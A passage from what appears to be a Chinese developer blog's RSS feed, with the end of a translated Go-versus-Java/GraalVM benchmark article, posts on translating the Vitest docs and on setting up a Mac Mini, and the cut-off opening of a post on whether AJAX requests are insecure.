的问题”。它以缓慢而闻名，这可能不再是合理，而是更具历史意义。它确实有一些性能敏感区域，包括存储对象数据的堆；管理堆的垃圾收集器；以及即时 (JIT) 编译器。</p><p><img src="/assets/01.f263bfaa.png" alt="01.png"></p><p>多年来，Java 已经有许多不同的垃圾收集算法，包括串行、并行、并发标记/清除、G1 和新的 ZGC 垃圾收集器。现代垃圾收集器也在最大限度地减少垃圾收集 “stop the world” 暂停的持续时间。</p><p>Oracle 实验室开发了一种名为 <a href="https://www.graalvm.org/" target="_blank" rel="noopener noreferrer">GraalVM</a> 的新 Java 虚拟机，它是用 Java 编写的，具有新的编译器和一些令人兴奋的新特性，例如能够将 Java 字节码转换为无需 Java VM 即可运行的本机映像。</p><h2 id="go-的一点历史" tabindex="-1">Go 的一点历史 <a class="header-anchor" href="#go-的一点历史" aria-hidden="true">#</a></h2><p>Go 由 Google 的 Robert Griesemer、Rob Pike 和 Ken Thomson 创建。 （他们之间对 UNIX、B、C、Plan9、UNIX 窗口系统等做出了重大贡献。）也是<a href="https://go.dev/" target="_blank" rel="noopener noreferrer">开源</a>的，在 2012 年发布了 1.0 版，并在 2020 年发布了 1.15 版。它在两个方面都在快速增长 采用以及语言和工具生态系统本身。</p><p>Go 受到 C、Python、Javascript 和 C++ 的影响。 它打算成为高性能网络和多处理的最佳语言。</p><p>当我在记录这个blog的时候，StackOverflow 有 27,872 个问题标记为“Go”，而 Java 有 1,702,730 个问题。</p><p>Go 是一种静态类型的编译语言。 它的语法类似于 C。 它具有内存安全、垃圾收集、结构类型和 CSP 风格的并发（通信顺序进程）。 它具有称为 goroutines 的轻量级进程（这些不是 OS 线程），用于在它们之间进行通信的通道（类型化，FIFO）。 该语言不提供竞争条件保护。</p><p>Go 是许多 CNCF 项目的首选语言，例如 Kubernetes、Istio、Prometheus 和 Grafana 都（大部分）用 Go 编写。</p><p>它旨在具有快速构建时间和快速执行。 它是固执己见的 —— 我们不要再争论两个或四个空格了！</p><p>Go 有什么好处（与 Java 相比）—— 这是根据我的经验得出的个人看法：</p><ul><li>更容易实现功能模式，如组合、纯函数、不可变状态。</li><li>样板代码要少得多（但仍然还是太多）。</li><li>它还处于生命周期的早期，因此它没有向后兼容的沉重负担 —— 但是他们仍然可以通过破坏来改进它。</li><li>它编译成一个本地静态链接二进制文件 —— 没有虚拟机层 —— 二进制文件包含运行程 序所需的一切，这对于“从头开始”容器来说非常有用。</li><li>它体积小，启动快，执行快。</li><li>没有 OOP、继承、泛型、断言、指针算术。</li><li>括号少，例如 <code>if x &gt; 3 { whatever }</code></li><li>强制执行没有循环依赖，没有未使用的变量或导入，没有隐式类型转换。</li></ul><p>那么，Go 的 &quot;问题&quot; 是什么？ 同样，这是我个人的看法，与 Java 相比：</p><ul><li>工具生态系统不成熟，尤其是依赖管理——有几种选择，但没有一个是完美的，尤其是对于非开源开发；现在有一个明确的“winner”（Go 模块），但并不是每个人都采用它，所以仍然存在兼容性挑战。</li><li>使用新的(更新)的依赖项构建代码非常慢（就像 Maven 著名的“下载 Internet”问题）。</li><li>导入将代码绑定到存储库，这使得移动代码成为一场噩梦。</li><li>IDE 适用于编程、文档查找、自动完成等；但是调试、分析等仍然具有挑战性。</li><li>指针！ 我们以为我们在上个千年把它们留了下来！ 但至少没有指针算法。</li><li>没有 Java 风格的 try/catch 异常（你最终也会因为写<code>if err != nil</code>觉得太频繁了），没有函数风格的原语，如列表、映射函数等。</li><li>通常最终会实现一些基本算法，因为它尚不可用。最近，我编写了通过 sloe 进行比较和转换来遍历两个字符串（列表）槽的代码。在函数式语言中，我可以使用内置函数 <code>map</code> 来做到这一点。</li><li>没有动态链接！（可是“谁在乎呢？”）如果我们想使用带有“infect”静态链接代码的 GPL 等许可证的代码，这可能是一个真正的问题。</li><li>用于调整执行或垃圾收集、配置文件执行或优化算法的旋钮并不多 —— Java 有数百个垃圾收集调整选项，Go 有一个 —— 打开或关闭。</li></ul><h2 id="开始第一轮测试" tabindex="-1">开始第一轮测试 <a class="header-anchor" href="#开始第一轮测试" aria-hidden="true">#</a></h2><p>在第一轮中，我们在一台“小型”机器上进行了测试，在本例中是一台运行 macOS 的 2.5GHz 双核 Intel Core i7 笔记本电脑，配备 16GB RAM。我们运行了 100 个线程，每个线程有 10,000 个循环，加速时间为 10 秒。Java 应用程序在 JDK 11 和 Helidon 2.0.1 上运行。使用 Go 1.13.3 编译的 Go 应用程序。</p><p>结果如下：</p><table><thead><tr><th style="text-align:left;">Application</th><th style="text-align:left;">Logging</th><th style="text-align:left;">Warmup</th><th style="text-align:left;">Avg. Response Time (ms)</th><th style="text-align:left;">Transactions / sec</th><th style="text-align:left;">Memory (RSS) (Start/End)</th></tr></thead><tbody><tr><td style="text-align:left;">Golang</td><td style="text-align:left;">Yes</td><td style="text-align:left;">No</td><td style="text-align:left;">5.79</td><td style="text-align:left;">15330.60</td><td style="text-align:left;">5160KB / 15188KB</td></tr><tr><td style="text-align:left;">Golang</td><td style="text-align:left;">No</td><td style="text-align:left;">No</td><td style="text-align:left;">4.18</td><td style="text-align:left;">20364.11</td><td style="text-align:left;">5164KB / 15144KB</td></tr><tr><td style="text-align:left;">Golang</td><td style="text-align:left;">No</td><td style="text-align:left;">Yes</td><td style="text-align:left;">3.97</td><td style="text-align:left;">21333.33</td><td style="text-align:left;">10120KB / 15216KB</td></tr><tr><td style="text-align:left;">Java(Helidon)</td><td style="text-align:left;">Yes</td><td style="text-align:left;">No</td><td style="text-align:left;">12.13</td><td style="text-align:left;">8168.15</td><td style="text-align:left;">296376KB / 427064KB; committed = 169629KB +15976KB (NMT); reserved=1445329KB +5148KB (NMT)</td></tr><tr><td style="text-align:left;">Java(Helidon)</td><td style="text-align:left;">No</td><td style="text-align:left;">No</td><td style="text-align:left;">5.13</td><td style="text-align:left;">17332.82</td><td style="text-align:left;">282228KB / 430264KB; reserved=1444264KB +6280KB; committed=166632KB +15884KB</td></tr><tr><td style="text-align:left;">Java(Helidon)</td><td style="text-align:left;">No</td><td style="text-align:left;">Yes</td><td style="text-align:left;">4.84</td><td style="text-align:left;">18273.18</td><td style="text-align:left;">401228KB / 444556KB</td></tr></tbody></table><p>我们宣布 Go 成为了第一轮的获胜者。</p><p>这些是我对这些结果的观察：</p><ul><li>日志记录似乎是一个主要的性能损失，尤其是 java.util.logging。正因为如此，我们在有和没有日志的情况下运行了测试。我们还注意到日志记录是影响 Go 应用程序性能的一个重要因素。</li><li>Java 版本的内存占用要大得多，即使对于如此小而简单的应用程序也是如此。</li><li>预热对 JVM 产生了很大的影响 —— 我们知道 JVM 在运行时会进行优化，所以这是有道理的。</li><li>我在这个测试中比较了不同的执行模型——Go 应用程序被编译成本机可执行的二进制文件，而 Java 应用程序被编译成字节码，然后在虚拟机上运行。我决定引入 GraalVM 原生镜像，使 Java 应用程序的执行环境更接近 Go 应用程序的环境。</li></ul><h3 id="graalvm-原生镜像" tabindex="-1">GraalVM 原生镜像 <a class="header-anchor" href="#graalvm-原生镜像" aria-hidden="true">#</a></h3><p>GraalVM 具有本机映像功能，可让您获取 Java 应用程序并将其本质上编译为本机可执行代码。来自 GraalVM 网站：</p><blockquote><p>This executable includes the application classes, classes from its dependencies, runtime library classes, and statically linked native code from JDK. It does not run on the Java VM, but includes necessary components like memory management, thread scheduling, and so on from a different runtime system, called “Substrate VM”. Substrate VM is the name for the runtime components (like the deoptimizer, garbage collector, thread scheduling etc.).</p></blockquote><p>这是添加了 GraalVM 原生镜像测试的第一轮结果（使用 GraalVM EE 20.1.1 - JDK 11 构建的原生镜像）：</p><table><thead><tr><th style="text-align:left;">Application</th><th style="text-align:left;">Logging</th><th style="text-align:left;">Warmup</th><th style="text-align:left;">Avg. Response Time (ms)</th><th style="text-align:left;">Transactions / sec</th><th>Memory (RSS) (Start/End)</th></tr></thead><tbody><tr><td style="text-align:left;">Golang</td><td style="text-align:left;">Yes</td><td style="text-align:left;">No</td><td style="text-align:left;">5.79</td><td style="text-align:left;">15330.60</td><td>5160KB / 15188KB</td></tr><tr><td style="text-align:left;">Golang</td><td style="text-align:left;">No</td><td style="text-align:left;">No</td><td style="text-align:left;">4.18</td><td style="text-align:left;">20364.11</td><td>5164KB / 15144KB</td></tr><tr><td style="text-align:left;">Golang</td><td style="text-align:left;">No</td><td style="text-align:left;">Yes</td><td style="text-align:left;">3.97</td><td style="text-align:left;">21333.33</td><td>10120KB / 15216KB</td></tr><tr><td style="text-align:left;">Java(Helidon)</td><td style="text-align:left;">Yes</td><td style="text-align:left;">No</td><td style="text-align:left;">12.13</td><td style="text-align:left;">8168.15</td><td>296376KB / 427064KB; committed = 169629KB +15976KB (NMT); reserved=1445329KB +5148KB (NMT)</td></tr><tr><td style="text-align:left;">Java(Helidon)</td><td style="text-align:left;">No</td><td style="text-align:left;">No</td><td style="text-align:left;">5.13</td><td style="text-align:left;">17332.82</td><td>282228KB / 430264KB; reserved=1444264KB +6280KB; committed=166632KB +15884KB</td></tr><tr><td style="text-align:left;">Java(Helidon)</td><td style="text-align:left;">No</td><td style="text-align:left;">Yes</td><td style="text-align:left;">4.84</td><td style="text-align:left;">18273.18</td><td>401228KB / 444556KB</td></tr><tr><td style="text-align:left;">Native Image</td><td style="text-align:left;">Yes</td><td style="text-align:left;">No</td><td style="text-align:left;">12.01</td><td style="text-align:left;">7748.27</td><td>18256KB / 347204KB</td></tr><tr><td style="text-align:left;">Native Image</td><td style="text-align:left;">No</td><td style="text-align:left;">No</td><td style="text-align:left;">5.59</td><td style="text-align:left;">15753.24</td><td>169765KB / 347100KB</td></tr><tr><td style="text-align:left;">Native Image</td><td style="text-align:left;">No</td><td style="text-align:left;">Yes</td><td style="text-align:left;">5.22</td><td style="text-align:left;">17837.19</td><td>127436KB / 347132KB</td></tr></tbody></table><p>在这种情况下，与在 JVM 上运行应用程序相比，使用 GraalVM 原生映像并没有看到吞吐量或响应时间有任何实质性改进，但是内存占用更小。</p><p>以下是一些测试的响应时间图表：</p><p><img src="/assets/02.7ac97171.png" alt="02.png"><div align="center"><p style="color:#757575;font-size:14px;">第一轮的响应时间图</p></div></p><p>请注意，在所有三个 Java 变化中，第一个请求的响应时间要长得多（在左轴上寻找那条蓝线）。在所有情况下，我们还看到了一些峰值，我们认为这是由垃圾收集或优化引起的。</p><h2 id="第二轮" tabindex="-1">第二轮 <a class="header-anchor" href="#第二轮" aria-hidden="true">#</a></h2><p>接下来我们决定在更大的机器上运行测试。在这一轮中，我们使用了一台具有 36 个内核（每个内核两个线程）、256GB RAM、运行 Oracle Linux 7.8 的机器。</p><p>与第一轮一样，我们使用了 100 个线程，每个线程 10,000 个循环，10 秒的加速时间和相同版本的 Go、Java、Helidon 和 GraalVM。</p><p>结果如下：</p><table><thead><tr><th style="text-align:left;">Application</th><th style="text-align:left;">Logging</th><th style="text-align:left;"><strong>Warmup</strong></th><th style="text-align:left;">Avg. Response Time(ms)</th><th style="text-align:left;">Transactions/ sec</th><th>Memory (RSS) (Start/End)</th></tr></thead><tbody><tr><td style="text-align:left;">Native Image</td><td style="text-align:left;">Yes</td><td style="text-align:left;">No</td><td style="text-align:left;">5.61</td><td style="text-align:left;">14273.48</td><td>28256KB / 1508600KB</td></tr><tr><td style="text-align:left;">Native Image</td><td style="text-align:left;">No</td><td style="text-align:left;">No</td><td style="text-align:left;">0.25</td><td style="text-align:left;">82047.92</td><td>29368KB / 1506428KB</td></tr><tr><td style="text-align:left;">Native Image</td><td style="text-align:left;">No</td><td style="text-align:left;">Yes</td><td style="text-align:left;">0.25</td><td style="text-align:left;">82426.64</td><td>1293216KB / 1502724KB</td></tr><tr><td style="text-align:left;">Golang</td><td style="text-align:left;">Yes</td><td style="text-align:left;">No</td><td style="text-align:left;">4.72</td><td style="text-align:left;">18540.49</td><td>132334KB / 72433KB</td></tr><tr><td style="text-align:left;">Golang</td><td style="text-align:left;">No</td><td style="text-align:left;">No</td><td style="text-align:left;">1.69</td><td style="text-align:left;">37949.22</td><td>12864KB / 70716KB</td></tr><tr><td style="text-align:left;">Golang</td><td style="text-align:left;">No</td><td style="text-align:left;">Yes</td><td style="text-align:left;">1.59</td><td style="text-align:left;">39227.99</td><td>16764KB / 76996KB</td></tr><tr><td style="text-align:left;">Java(Helidon)</td><td style="text-align:left;">Yes</td><td style="text-align:left;">No</td><td style="text-align:left;">7.38</td><td style="text-align:left;">11216.42</td><td>318545KB / 529848KB</td></tr><tr><td style="text-align:left;">Java(Helidon)</td><td style="text-align:left;">No</td><td style="text-align:left;">No</td><td style="text-align:left;">0.40</td><td style="text-align:left;">74827.90</td><td>307672KB / 489568KB</td></tr><tr><td style="text-align:left;">Java(Helidon)</td><td style="text-align:left;">No</td><td style="text-align:left;">Yes</td><td style="text-align:left;">0.38</td><td style="text-align:left;">76306.75</td><td>398156KB / 480460KB</td></tr></tbody></table><p>我宣布 GraalVM 原生镜像在第二轮中获胜！</p><p>以下是这些测试的响应时间图：</p><p><img src="/assets/03.ec7246cc.png" alt="03.png"><div align="center"><p style="color:#757575;font-size:14px;">启用记录但没有预热的测试运行的响应时间</p></div><img src="/assets/04.5965b9ce.png" alt="04.png"><div align="center"><p style="color:#757575;font-size:14px;">没有记录和预热的测试运行的响应时间</p></div><img src="/assets/05.218aa0aa.png" alt="05.png"><div align="center"><p style="color:#757575;font-size:14px;">预热但没有记录的测试运行的响应时间</p></div></p><p>对于第二轮的一些观察：</p><ul><li>Java 变体在这个测试中表现得更好，并且在不使用日志记录时明显优于 Go</li><li>Java 似乎更能够使用硬件提供的多核和执行线程（与 Go 相比）——这在一定程度上是有道理的，因为 Go 旨在作为一种系统和网络编程语言，而且它是一种更年轻的语言，所以它是可以合理地假设 Java 有更多的时间来开发和调整优化</li><li>有趣的是，Java 是在多核处理器还不普及的时候设计的，而 Go 是在多核处理器普及的时候设计的。</li><li>特别是，Java 日志记录似乎已成功卸载到其他线程/内核，并且对性能的影响要小得多</li><li>这一轮的最佳表现来自 GraalVM 原生镜像，平均响应时间为 0.25 毫秒，每秒处理 82,426 个事务，而 Go 的最佳结果为 1.59 毫秒和 39,227 tps，但代价是内存增加了两个数量级用法！</li><li>GraalVM 原生镜像变体比在 JVM 上运行的相同应用程序快 30-40%</li><li>Java 变体的响应时间似乎更加一致，但峰值更多——我们推测这意味着 Go 正在执行更多、更小的垃圾收集</li></ul><h2 id="第三轮-在kubernetes中" tabindex="-1">第三轮 在Kubernetes中 <a class="header-anchor" href="#第三轮-在kubernetes中" aria-hidden="true">#</a></h2><p>在第三轮中，我们决定在 Kubernetes 集群中运行应用程序——你可能会说，这是一个更自然的微服务运行时环境。</p><p>在这一轮中，我们使用了一个具有三个工作节点的 Kubernetes 1.16.8 集群，每个节点有两个内核（每个有两个执行线程）、14GB 的 RAM 和 Oracle Linux 7.8。在某些测试中，我们为每个变体运行了一个 pod，在其他测试中运行了 100 个。</p><p>应用程序访问是通过 Traefik 入口控制器，其中 JMeter 在 Kubernetes 集群外部运行以进行一些测试，而对于其他测试，我们使用 ClusterIP 并在集群中运行 JMeter。</p><p>与之前的测试一样，我们使用了 100 个线程，每个线程 10,000 个循环和 10 秒的加速时间。</p><p>以下是每个变体的容器尺寸：</p><ul><li>Go 11.6MB</li><li>Java/Helidon 1.41GB</li><li>Java/Helidon JLinked 150MB</li><li>本机图像 25.2MB</li></ul><p>结果如下：</p><table><thead><tr><th style="text-align:left;">Pods</th><th style="text-align:left;">Access</th><th style="text-align:left;">Application</th><th style="text-align:left;">Logging</th><th style="text-align:left;">Avg. Response Time (ms)</th><th>Transactions / sec</th></tr></thead><tbody><tr><td style="text-align:left;">1</td><td style="text-align:left;">Traefik</td><td style="text-align:left;">Golang</td><td style="text-align:left;">No</td><td style="text-align:left;">5.07</td><td>14651.80</td></tr><tr><td style="text-align:left;">1</td><td style="text-align:left;">Traefik</td><td style="text-align:left;">Native Image</td><td style="text-align:left;">No</td><td style="text-align:left;">5.05</td><td>15812.28</td></tr><tr><td style="text-align:left;">1</td><td style="text-align:left;">Traefik</td><td style="text-align:left;">Java (Helidon)</td><td style="text-align:left;">No</td><td style="text-align:left;">7.05</td><td>11823.69</td></tr><tr><td style="text-align:left;">1</td><td style="text-align:left;">Traefik</td><td style="text-align:left;">Java Jlink (Helidon)</td><td style="text-align:left;">No</td><td style="text-align:left;">9.08</td><td>9271.02</td></tr><tr><td style="text-align:left;">100</td><td style="text-align:left;">Traefik</td><td style="text-align:left;">Golang</td><td style="text-align:left;">No</td><td style="text-align:left;">5.06</td><td>15646.75</td></tr><tr><td style="text-align:left;">100</td><td style="text-align:left;">Traefik</td><td style="text-align:left;">Native Image</td><td style="text-align:left;">No</td><td style="text-align:left;">5.17</td><td>15462.40</td></tr><tr><td style="text-align:left;">100</td><td style="text-align:left;">Traefik</td><td style="text-align:left;">Java (Helidon)</td><td style="text-align:left;">No</td><td style="text-align:left;">11.42 without warmup/ 5.07 with warmup</td><td>8015.96 / 15838.32</td></tr><tr><td style="text-align:left;">100</td><td style="text-align:left;">Traefik</td><td style="text-align:left;">Java Jlink (Helidon)</td><td style="text-align:left;">No</td><td style="text-align:left;">9.61 / 5.64</td><td>9424.62 / 14732.31</td></tr><tr><td style="text-align:left;">1</td><td style="text-align:left;">ClusterIP</td><td style="text-align:left;">Golang</td><td style="text-align:left;">No</td><td style="text-align:left;">1.2</td><td>43712.02</td></tr><tr><td style="text-align:left;">1</td><td style="text-align:left;">ClusterIP</td><td style="text-align:left;">Native Image</td><td style="text-align:left;">No</td><td style="text-align:left;">2.12</td><td>30497.10</td></tr><tr><td style="text-align:left;">1</td><td style="text-align:left;">ClusterIP</td><td style="text-align:left;">Java (Helidon)</td><td style="text-align:left;">No</td><td style="text-align:left;">7.19 / 5.73</td><td>12819.52 / 14878.95</td></tr><tr><td style="text-align:left;">1</td><td style="text-align:left;">ClusterIP</td><td style="text-align:left;">Java Jlink (Helidon)</td><td style="text-align:left;">No</td><td style="text-align:left;">7.19 / 6.27</td><td>12610.49 / 13817.68</td></tr><tr><td style="text-align:left;">100</td><td style="text-align:left;">ClusterIP</td><td style="text-align:left;">Golang</td><td style="text-align:left;">No</td><td style="text-align:left;">1.25</td><td>34170.51</td></tr><tr><td style="text-align:left;">100</td><td style="text-align:left;">ClusterIP</td><td style="text-align:left;">Native Image</td><td style="text-align:left;">No</td><td style="text-align:left;">1.32</td><td>33558.17</td></tr><tr><td style="text-align:left;">100</td><td style="text-align:left;">ClusterIP</td><td style="text-align:left;">Java (Helidon)</td><td style="text-align:left;">No</td><td style="text-align:left;">3.35 / 2.04</td><td>14358.94 / 24410.48</td></tr><tr><td style="text-align:left;">100</td><td style="text-align:left;">ClusterIP</td><td style="text-align:left;">Java Jlink (Helidon)</td><td style="text-align:left;">No</td><td style="text-align:left;">2.56 / 1.87</td><td>18098.23 / 26520.97</td></tr></tbody></table><p>以下是一些响应时间图表：</p><p><img src="/assets/06.b884f952.png" alt="06.png"><div align="center"><p style="color:#757575;font-size:14px;">Kubernetes 测试的响应时间 </p></div></p><p>那么我们明白到了什么？</p><ul><li>Kubernetes 似乎并没有快速扩展</li><li>Java 似乎比 Go 更擅长使用所有可用的内核/线程——我们在 Java 测试期间看到了更好的 CPU 利用率</li><li>Java 性能在具有更多内核和内存的机器上更好，Go 在更小/不太强大的机器上性能更好</li><li>Go 的性能总体上稍微一致 —— 可能是由于 Java 的垃圾收集</li><li>在“生产规模”的机器上，Java 很容易与 Go 一样快，或者更快</li><li>日志记录似乎是我们在 Go 和 Java 中遇到的主要瓶颈</li><li>Java 的现代版本和 Helidon 等新框架在消除/减少 Java 一些众所周知且长期存在的问题（例如冗长、GC 性能、启动时间等）的痛苦方面取得了长足的进步。</li></ul></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[翻译 Vitest 的心得]]></title>
            <link>https://elonehoo.xyz/posts/cn-vitest.html</link>
            <guid>https://elonehoo.xyz/posts/cn-vitest.html</guid>
            <pubDate>Tue, 22 Feb 2022 12:00:00 GMT</pubDate>
            <description><![CDATA[<p>现在 Vitest 还处于开发阶段，其实原则上官网团队是不建议现在进行翻译的。</p>
<p>但是由于一些个人问题，我还是得现在进行翻译，保证我可以在学校社团内部进行推广，但是由于翻译对于我而言难度还是较为巨大，所以还是十分希望会有更多志同道合的同学可以一起帮助我进行翻译。谢谢大家</p>
]]></description>
            <content:encoded><![CDATA[<div><p>现在 Vitest 还处于开发阶段，其实原则上官网团队是不建议现在进行翻译的。</p><p>但是由于一些个人问题，我还是得现在进行翻译，保证我可以在学校社团内部进行推广，但是由于翻译对于我而言难度还是较为巨大，所以还是十分希望会有更多志同道合的同学可以一起帮助我进行翻译。谢谢大家</p><hr><p>Vitest 是一个非常有意思的测试框架，在这之前其实我很少会使用到测试框架，因为自己其实在使用 Vitest 之前基本没有高强度的接触过测试框架，所以第一次使用 Vitest 的时候带给了我很多惊喜。即时浏览模式的可玩性，跟 Vite 一样的 HMR 模式，让我第一次觉得测试也不再枯燥。</p><p>在当我产生了一个推广 Vitest 的想法的时候，我就告诉自己这是一个十分有意思的事情，虽然我只打算从身边的人做起。就先从学校的社团开始推广，其中也经历了很多虚假的事情，大多数同学都会说，去试试，去试试，但是最终他们看到官方文档只有英文的时候，大多数都选择了不了了之，当然更多的肯定是置之不理。</p><p>但是也有很多的同学，来询问我怎么用，怎么操作，怎么玩，就促使我萌生了一个大胆的想法，既然现在还没有官方的中文翻译，那我就来进行翻译，虽然我的英语也不是很流利，但是可以借助大量的翻译软件，和自己对于英语的理解，尝试翻译，虽然中途产生了很多翻译的问题，幸好 <a href="https://github.com/antfu" target="_blank" rel="noopener noreferrer">Anthony Fu</a> 对于民间翻译，并没有过多的排斥，跟我讲解了正确的翻译意思。</p><p>当然只有一个人，确实很难跟上 Vitest 的官方文档，所以也想在很多地方寻求其他同学的帮忙，但是一想到自己是民间翻译，上不了台面，就不太抹的开面去寻求帮助，到今天为止，经过很多天的努力，终于跟上了官方的<a href="https://vitest.dev/" target="_blank" rel="noopener noreferrer">v0.5.1</a>的翻译，我想日后的翻译应该会轻松不少，当然在社团的推广活动也因为有了这个中文的文档，有了进展，很多同学开始上手使用 Vitest 了。</p><p>如果有同学看到了这个博客，想一起完成这个民间翻译，欢迎大家的加入 <a href="https://github.com/xiaoxunyao/cn.vitest.dev" target="_blank" rel="noopener noreferrer">GitHub 地址</a> ｜ <a href="https://cn-vitest.netlify.app/" target="_blank" rel="noopener noreferrer">浏览地址</a> 。</p></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[属于我的 Mac 配置]]></title>
            <link>https://elonehoo.xyz/posts/my-mac.html</link>
            <guid>https://elonehoo.xyz/posts/my-mac.html</guid>
            <pubDate>Wed, 09 Feb 2022 12:00:00 GMT</pubDate>
            <description><![CDATA[<p>在2022年2月9号，年刚刚过完，就收到了Mac Mini，因为一开始使用的是 Intel 要迁移到 Apple Silicon 。有些 app 即使存在 Apple Silicon 版本，通过迁移工具安装的也会是 Intel 架构、需要 Rosetta 2 兼容。所以我选择了从头全新设置。</p>
<p>刚好也把这作为一个重新审视自己数字生活的契机。</p>
]]></description>
            <content:encoded><![CDATA[<div><p>在2022年2月9号，年刚刚过完，就收到了Mac Mini，因为一开始使用的是 Intel 要迁移到 Apple Silicon 。有些 app 即使存在 Apple Silicon 版本，通过迁移工具安装的也会是 Intel 架构、需要 Rosetta 2 兼容。所以我选择了从头全新设置。</p><p>刚好也把这作为一个重新审视自己数字生活的契机。</p><hr><h2 id="系统初始化" tabindex="-1">系统初始化 <a class="header-anchor" href="#系统初始化" aria-hidden="true">#</a></h2><p>一开始启动，选择了 英文 作为首选语言，因为英语特别差，所以需要加强英语的学习，有一个沉浸式的语言体验环境。</p><p>首先，我进行了触摸板的设置， 进入 System Preferences -&gt; Trackpad 开启 Tap to Click：</p><p><img src="/assets/01.b46883c3.png" alt="01.png"></p><p>紧接着进入 Accessibility -&gt; Pointer Control -&gt; Trackpad Options 里开启 Three finger drag：</p><p><img src="/assets/02.d58793dc.png" alt="02.png"></p><p>然后进入输入法设置里，默认英语输入法设置为 ABC - Extended（与 US 相同的键盘布局，但并不显示美国国旗），增加简体中文的拼音输入。</p><p><img src="/assets/03.7054da26.png" alt="03.png"></p><h2 id="软件方面" tabindex="-1">软件方面 <a class="header-anchor" href="#软件方面" aria-hidden="true">#</a></h2><ul><li><a href="https://s.yunme.me/" target="_blank" rel="noopener noreferrer">Shadowrocket</a> 由于 GitHub 有时候会进不去，所以会需要翻墙软件，我会使用这个软件进行翻墙。</li><li><a href="https://www.duetdisplay.com/" target="_blank" rel="noopener noreferrer">Duet</a> 因为是 Mac Mini 所以外出的话，携带显示器是一件比较不方便的事情，所以使用它在外出的时候可以使用 ipad 作为显示器，增加了一定的便携性。</li><li><a href="https://github.com/aonez/Keka" target="_blank" rel="noopener noreferrer">KeKa</a> 个人觉得是 Mac OS 上最好用的压缩软件。支持市面上全部的压缩格式。</li><li><a href="https://discord.com/" target="_blank" rel="noopener noreferrer">Discord</a> 很多社区都是在这里进行交流的。例如 「Vue/Vite/Vitest」。</li><li><a href="https://reincubate.com/camo/" target="_blank" rel="noopener noreferrer">Camo</a> Mac Mini 没有摄像头，所以搭配 iphone 作为摄像头使用。</li><li><a href="https://getkap.co/" target="_blank" rel="noopener noreferrer">Kap</a> 用于录屏导出成 GIF。</li><li><a href="https://www.google.com/intl/en_us/chrome/" target="_blank" rel="noopener noreferrer">Chrome</a> 在开发的时候，虽然可能 Safari 也可以用，但是还是使用 Chrome 比较好。</li><li><a href="https://typora.io/" target="_blank" rel="noopener noreferrer">Typora</a> 无论在哪里，Typora 都长在了我的审美之上。</li><li><a href="https://www.tableplus.io/download" target="_blank" rel="noopener noreferrer">Table Plus</a> 长得比较好看的 MySQL 客户端。</li></ul><h2 id="命令行方面" tabindex="-1">命令行方面 <a class="header-anchor" href="#命令行方面" aria-hidden="true">#</a></h2><ul><li><a href="https://www.oracle.com/java/technologies/downloads/" target="_blank" rel="noopener noreferrer">JDK</a> 这是java环境的必需品，所以无需多说。</li><li><a href="https://nodejs.org/en/" target="_blank" rel="noopener noreferrer">nodejs</a> 前端必备工具。</li><li><a href="https://yarnpkg.com/" target="_blank" rel="noopener noreferrer">yarn</a> 个人非常喜欢的包下载工具。</li><li><a href="https://pnpm.io/" target="_blank" rel="noopener noreferrer">pnpm</a> 比较先进的包下载工具。</li><li><a href="https://git-scm.com/" target="_blank" rel="noopener noreferrer">Git</a> 我没有办法离开他。</li></ul><h2 id="开发软件" tabindex="-1">开发软件 <a class="header-anchor" href="#开发软件" aria-hidden="true">#</a></h2><ul><li><a href="https://www.jetbrains.com/idea/" target="_blank" rel="noopener noreferrer">IntelliJ IDEA</a> 开发java最好的IDE，没有之一。</li><li><a href="https://code.visualstudio.com/" target="_blank" rel="noopener noreferrer">VsCode</a> 前端开发的首选。</li></ul><h2 id="软件配置" tabindex="-1">软件配置 <a class="header-anchor" href="#软件配置" aria-hidden="true">#</a></h2><p>会登陆自己的VPN账号，进行翻墙操作后，登陆自己的Chrome账号，配置自己的Git。</p><p>登陆自己的VsCode账号，这样会自动下载插件。</p><p>使用账号登陆IntelliJ IDEA。</p><h2 id="字体" tabindex="-1">字体 <a class="header-anchor" href="#字体" aria-hidden="true">#</a></h2><p>SF Pro、SF Mono、New York 虽然在 macOS 中被系统组件广泛使用，但是并不能直接在其他 app 里（如Word、VS Code、浏览器 font-family 等）指定使用。好在，Apple 有提供官方的下载渠道： <a href="https://developer.apple.com/fonts/" target="_blank" rel="noopener noreferrer">https://developer.apple.com/fonts/</a> ，下载安装后即可正常使用了。</p></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[AJAX请求为什么不安全]]></title>
            <link>https://elonehoo.xyz/posts/ajax-not-safe.html</link>
            <guid>https://elonehoo.xyz/posts/ajax-not-safe.html</guid>
            <pubDate>Thu, 04 Feb 2021 12:00:00 GMT</pubDate>
            <description><![CDATA[<ol>
<li>AJAX请求真的不安全么？</li>
<li>AJAX请求哪里不安全？</li>
<li>怎么样让AJAX请求更安全？</li>
</ol>
]]></description>
            <content:encoded><![CDATA[<div><ol><li>AJAX请求真的不安全么？</li><li>AJAX请求哪里不安全？</li><li>怎么样让AJAX请求更安全？</li></ol><hr><h2 id="简介" tabindex="-1">简介 <a class="header-anchor" href="#简介" aria-hidden="true">#</a></h2><p>从入坑前端开始,一直到现在,我们都知道AJAX请求都是以一种极高的频率重复出现,当然我们也解决过不少AJAX中遇到的问题,如跨域调试,错误调试等等.</p><p>每次浏览大多数的后端的文章,都发现会提到AJAX请求的不安全的特性,还是建议使用普通的http请求!</p><p>我却很纠结一个问题：<strong>AJAX请求真的不安全么？为什么我自己写后台时并没有发现这个问题？</strong></p><p>于是，开始准备搜集资料，结合自己已有的认知，整理成一份解决方案，分析<strong>AJAX请求真的不安全么？哪里不安全？</strong></p><h2 id="ajax请求真的不安全吗" tabindex="-1">AJAX请求真的不安全吗? <a class="header-anchor" href="#ajax请求真的不安全吗" aria-hidden="true">#</a></h2><h3 id="结论" tabindex="-1">结论 <a class="header-anchor" href="#结论" aria-hidden="true">#</a></h3><p>首先,放出结论: <code>AJAX请求是否安全,是由后端决定的</code></p><p>有这样一个说法：<strong>如果某个Web应用具备良好的安全性，那么再怎么用“不安全的AJAX”也削弱不了它的安全性，反之如果应用本身存在漏洞，不管用何种技术请求，它都是不安全的</strong></p><p><img src="/assets/01.64e5b58e.png" alt="01.png"></p><p>那么为什么会有这种说法？<strong>因为在Web应用中，客户端输入不可信是一个基本原则</strong></p><h3 id="ajax不安全的说法从何而来" tabindex="-1">AJAX不安全的说法从何而来 <a class="header-anchor" href="#ajax不安全的说法从何而来" 